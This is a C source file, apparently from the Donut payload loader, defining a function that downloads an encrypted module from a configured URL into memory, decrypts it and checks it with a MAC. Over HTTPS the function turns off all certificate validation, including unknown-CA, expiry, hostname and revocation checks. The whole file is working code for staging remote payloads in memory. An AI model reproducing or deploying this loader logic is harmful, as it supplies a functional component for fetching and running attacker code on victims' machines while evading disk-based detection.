/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

BOOL DownloadModule(PDONUT_INSTANCE inst) {
    HINTERNET       hin, con, req;
    PBYTE           buf;
    DWORD           s, n, rd, len, code=0;
    BOOL            bResult = FALSE, bSecure = FALSE;
    URL_COMPONENTS  uc;
    CHAR            host[DONUT_MAX_URL], 
                    file[DONUT_MAX_URL];
    
    // default flags for HTTP client
    DWORD flags = INTERNET_FLAG_KEEP_CONNECTION   | 
                  INTERNET_FLAG_NO_CACHE_WRITE    | 
                  INTERNET_FLAG_NO_UI             |
                  INTERNET_FLAG_RELOAD            |
                  INTERNET_FLAG_NO_AUTO_REDIRECT;
    
    Memset(&uc, 0, sizeof(uc));
    
    uc.dwStructSize     = sizeof(uc);
    uc.lpszHostName     = host;
    uc.lpszUrlPath      = file;
    uc.dwHostNameLength = DONUT_MAX_URL;
    uc.dwUrlPathLength  = DONUT_MAX_URL;
    
    DPRINT("Decoding URL %s", inst->http.url);
    
    if(!inst->api.InternetCrackUrl(
      inst->http.url, 0, ICU_DECODE, &uc)) {
      return FALSE;
    }
    
    bSecure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    
    // if secure connection, update the flags to ignore
    // invalid certificates
    if(bSecure) {
      flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID   |
               INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
               INTERNET_FLAG_SECURE;
    }
                  
    DPRINT("Initializing WININET");
    
    hin = inst->api.InternetOpen(
      NULL, INTERNET_OPEN_TYPE_PRECONFIG, 
      NULL, NULL, 0);
    
    if(hin == NULL) return FALSE;

    DPRINT("Creating %s connection for %s", 
      bSecure ? "HTTPS" : "HTTP", host);
      
    con = inst->api.InternetConnect(
        hin, host, uc.nPort, NULL, NULL, 
        INTERNET_SERVICE_HTTP, 0, 0);
        
    if(con != NULL) {
      DPRINT("Creating HTTP %s request for %s", 
        inst->http.req, file);
        
      req = inst->api.HttpOpenRequest(
              con, inst->http.req, 
              file, NULL, NULL, NULL, flags, 0);
              
      if(req != NULL) {
        
        // see if we should ignore invalid certificates for this request
        if(bSecure) {
          if(flags & INTERNET_FLAG_IGNORE_CERT_CN_INVALID) {
            n = sizeof (s);
            
            s = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                SECURITY_FLAG_IGNORE_WRONG_USAGE       |
                SECURITY_FLAG_IGNORE_REVOCATION;
                
            DPRINT("Setting option to ignore invalid certificates");
          
            inst->api.InternetSetOption(
              req, 
              INTERNET_OPTION_SECURITY_FLAGS, 
              &s, 
              sizeof(s));
          }
        }
        DPRINT("Sending request");
        
        if(inst->api.HttpSendRequest(req, NULL, 0, NULL, 0)) {
          len  = sizeof(DWORD);
          code = 0;
          DPRINT("Querying status code");
          
          if(inst->api.HttpQueryInfo(
              req, 
              HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
              &code, &len, 0))
          {
            DPRINT("Code is %ld", code);
            
            if(code == HTTP_STATUS_OK) {
              DPRINT("Querying content length");
              
              len           = sizeof(SIZE_T);
              inst->mod_len = 0;
              
              if(inst->api.HttpQueryInfo(
                req, 
                HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
                &inst->mod_len, &len, 0))
              {
                if(inst->mod_len != 0) {
                  DPRINT("Allocating memory for module");
                  
                  inst->module.p = inst->api.VirtualAlloc(
                    NULL, inst->mod_len, 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_READWRITE);
                    
                  if(inst->module.p != NULL) {
                    rd = 0;
                    DPRINT("Downloading module into memory");
                    bResult = inst->api.InternetReadFile(
                      req, 
                      inst->module.p, 
                      inst->mod_len, &rd);
                  }
                }
              }
            }
          }
        }
        DPRINT("Closing request handle");
        inst->api.InternetCloseHandle(req);
      }
      DPRINT("Closing HTTP connection");
      inst->api.InternetCloseHandle(con);
    }
    DPRINT("Closing internet handle");
    inst->api.InternetCloseHandle(hin);
       
#if !defined(NOCRYPTO)
    if(bResult) {
      PDONUT_MODULE mod = inst->module.p;
      
      DPRINT("Decrypting %lli bytes of module", inst->mod_len);
    
      donut_decrypt(inst->mod_key.mk, 
              inst->mod_key.ctr,
              mod, 
              inst->mod_len);
            
      DPRINT("Generating hash to verify decryption");
      ULONG64 mac = maru(inst->sig, inst->iv);
      
      DPRINT("Module : %016llx | Result : %016llx", mod->mac, mac);
      
      if(mac != mod->mac) {
        DPRINT("Decryption failed");
        return FALSE;
      }
    }
#endif
    return bResult;
}